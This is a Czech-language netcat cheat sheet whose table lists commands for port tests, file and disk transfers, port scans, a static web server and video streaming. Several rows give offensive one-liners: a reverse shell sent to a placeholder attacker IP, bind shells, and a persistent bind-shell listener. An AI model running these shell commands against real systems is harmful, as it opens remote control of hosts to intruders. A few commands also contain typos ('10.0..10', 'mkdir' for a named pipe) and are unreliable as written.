# <center>netcat cheatsheet</center>
|<b>Prikaz</b>|<b>Popis</b>|
|---|---|
|<b>nc 10.0.0.10 80</b>|Testuje zda-li je vzdaleny TCP port otevreny (-u pro UDP)|
|<b>nc -l 1234</b>|Nastavi TCP server naslouchajici na portu 1234 (-u pro UDP)|
|<b>nc -k -l 1234</b>|Udrzuje naslouchajici netcat nazivu dokud aktualni spojeni neskonci|
|<b>nc 10.0.0.10 1234 < file.tgz</b>|Prenos souboru na vzdaleny koncovy bod pres netcat|
|<b>cat file.tgz \| nc 10.0.0.10 1234</b>|Prenos souboru na vzdaleny koncovy bod pres netcat|
|<b>nc -l 1234 > file.tgz</b>|Prijem a ulozeni souboru pres netcat|
|<b>tar -cf-. \| nc -v 10.0.0.10 1234</b>|Vytvori tarball a prenese jej do netcatu|
|<b>nc -lv 1234 \| tar -xvf -</b>|Prijme tarball a extrahuje ho do aktualniho adresare|
|<b>nc -z 10.0.0.10 1-1000</b>|Oskenuje rozsah portu na cil|
|<b>nc -z 10.0..10 1-100 200-300</b>|Oskenuje vice rozsahu portu|
|<b>nc -vuz -w1 10.0.0.10 1-1000</b>|Oskenuje rozsah UDP portu s 1-sekundovou prodlevou|
|<b>printf "GET /HTTP/1.0\\r\\n\\r\\n" \| nc google.com 80</b>|Odesle HTTP pozadavek|
|<b>nc <utocnikova-ip> 4444 -e /bin/bash</b>|Vytvori reverzni shell na cilovem hostu|
|<b>nc -l 4444 -e /bin/bash</b>|Vytvori bind shell na cilovem hostu|
|<b>nc -k -l 4444 -e /bin/bash</b>|Vytvori presistentni netcat naslouchac pro bind shell|
|<b>nc -l 12345 -c \`uptime\`</b>|Spusti prikaz a presmeruje vystup na klienta|
|<b>dd if=/dev/sdb \| gzip -c \| nc 10.0.0.10 1234</b>|Presun harddisku v gzipu|
|<b>nc -l 1234 \| sudo dd of=/backup/sdb.img.gz</b>|Ulozi presunuty harddisk img|
|<b>while true; do nc -l 8000 < test.html; done</b>|Server pro statickou web stranku|
|<b>mkdir /tmp/pipe; cat video.mp4 > /tmp/pipe & nc -ul 12345 < /tmp/pipe</b>|Zacne streamovat video pri pripojeni klienta|
|<b>nc -u 10.0.0.10 12345 \| mplayer -</b>|Prijem a prehrati video streamu s mplayerem|